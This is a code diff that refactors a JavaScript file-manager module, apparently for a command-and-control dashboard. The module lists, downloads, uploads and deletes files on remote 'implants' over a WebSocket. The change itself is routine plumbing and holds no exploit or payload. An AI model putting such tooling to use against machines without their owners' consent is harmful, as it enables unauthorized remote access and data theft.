@@ -7,32 +7,56 @@ const FileManager = {
 
     init(socket) {
         this.socket = socket;
+        console.log('FileManager initialized with socket');
         this.setupEventListeners();
     },
 
     setupEventListeners() {
         // Navigation buttons
-        document.getElementById('navigate-up').addEventListener('click', () => this.navigateUp());
-        document.getElementById('refresh-files').addEventListener('click', () => this.refreshFiles());
-        document.getElementById('navigate-path').addEventListener('click', () => this.navigateToPath());
+        const navigateUpBtn = document.getElementById('navigate-up');
+        const refreshFilesBtn = document.getElementById('refresh-files');
+        const navigatePathBtn = document.getElementById('navigate-path');
+        const pathInput = document.getElementById('path-input');
+
+        if (navigateUpBtn) {
+            navigateUpBtn.addEventListener('click', () => this.navigateUp());
+        }
+        
+        if (refreshFilesBtn) {
+            refreshFilesBtn.addEventListener('click', () => this.refreshFiles());
+        }
+        
+        if (navigatePathBtn) {
+            navigatePathBtn.addEventListener('click', () => this.navigateToPath());
+        }
 
         // Path input
-        document.getElementById('path-input').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                this.navigateToPath();
+        if (pathInput) {
+            pathInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    this.navigateToPath();
+                }
+            });
+        }
+
+        // Use custom event for WebSocket messages instead of socket.on
+        document.addEventListener('socket-message', (event) => {
+            const message = event.detail;
+            if (message.type === 'file_list') {
+                this.handleFileList(message);
+            } else if (message.type === 'file_download') {
+                this.handleFileDownload(message);
+            } else if (message.type === 'file_upload_complete') {
+                this.handleFileUploadComplete(message);
             }
         });
-
-        // Socket event listeners
-        this.socket.on('file_list', this.handleFileList.bind(this));
-        this.socket.on('file_download', this.handleFileDownload.bind(this));
-        this.socket.on('file_upload_complete', this.handleFileUploadComplete.bind(this));
     },
 
     selectImplant(implantId) {
+        console.log(`FileManager: Setting selected implant to ${implantId}`);
         this.selectedImplant = implantId;
         this.currentPath = '/';
-        this.refreshFiles();
+        return implantId;
     },
 
     navigateUp() {
@@ -47,6 +71,11 @@ const FileManager = {
 
     navigateToPath() {
         const pathInput = document.getElementById('path-input');
+        if (!pathInput) {
+            console.error('Path input element not found');
+            return;
+        }
+        
         const newPath = pathInput.value.trim();
         
         if (!newPath) {
@@ -64,17 +93,32 @@ const FileManager = {
             return;
         }
 
-        document.getElementById('path-input').value = this.currentPath;
+        const pathInput = document.getElementById('path-input');
+        if (pathInput) {
+            pathInput.value = this.currentPath;
+        }
         
-        this.socket.emit('get_files', {
-            implant_id: this.selectedImplant,
-            path: this.currentPath
-        });
+        // Send request via WebSocketManager instead of direct socket emit
+        if (WebSocketManager && WebSocketManager.send) {
+            WebSocketManager.send({
+                type: 'get_files',
+                implant_id: this.selectedImplant,
+                path: this.currentPath
+            });
+            console.log(`Requested files for path: ${this.currentPath}`);
+        } else {
+            console.error('WebSocketManager not available');
+        }
     },
 
     handleFileList(data) {
         this.fileList = data.files;
         const fileList = document.getElementById('file-list');
+        if (!fileList) {
+            console.error('File list element not found');
+            return;
+        }
+        
         fileList.innerHTML = '';
 
         // Add parent directory entry if not at root
@@ -143,7 +187,9 @@ const FileManager = {
     downloadFile(path) {
         if (!this.selectedImplant) return;
 
-        this.socket.emit('download_file', {
+        // Use WebSocketManager instead of socket.emit
+        WebSocketManager.send({
+            type: 'download_file',
             implant_id: this.selectedImplant,
             path: path
         });
@@ -169,7 +215,9 @@ const FileManager = {
 
         const reader = new FileReader();
         reader.onload = (e) => {
-            this.socket.emit('upload_file', {
+            // Use WebSocketManager instead of socket.emit
+            WebSocketManager.send({
+                type: 'upload_file',
                 implant_id: this.selectedImplant,
                 path: this.currentPath + '/' + file.name,
                 content: e.target.result
@@ -187,7 +235,9 @@ const FileManager = {
         if (!this.selectedImplant) return;
 
         if (confirm('Are you sure you want to delete this file?')) {
-            this.socket.emit('delete_file', {
+            // Use WebSocketManager instead of socket.emit
+            WebSocketManager.send({
+                type: 'delete_file',
                 implant_id: this.selectedImplant,
                 path: path
             });
@@ -195,21 +245,9 @@ const FileManager = {
     }
 };
 
+// Remove the duplicate initialization since WebSocketManager now handles this
 // Initialize when document is ready
 document.addEventListener('DOMContentLoaded', () => {
-    // Initialize WebSocket connection
-    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-    const socket = new WebSocket(`${protocol}//${window.location.host}/ws/dashboard`);
-
-    // Handle WebSocket messages
-    socket.onmessage = (event) => {
-        const data = JSON.parse(event.data);
-        if (data.type === 'file_list') {
-            updateFileList(data.files);
-        } else if (data.type === 'file_content') {
-            handleFileContent(data);
-        }
-    };
-
-    FileManager.init(socket);
+    // WebSocketManager will initialize this module
+    console.log('FileManager waiting for WebSocketManager initialization');
 }); 
